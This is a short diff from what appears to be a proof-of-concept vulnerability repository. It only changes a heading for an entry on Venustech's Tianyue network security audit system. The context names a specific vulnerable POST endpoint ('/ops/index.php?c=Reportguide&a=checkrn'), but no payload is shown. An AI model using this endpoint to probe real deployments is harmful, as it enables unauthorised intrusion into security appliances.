@@ -6,7 +6,7 @@
 app="启明星辰-天玥网络安全审计"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
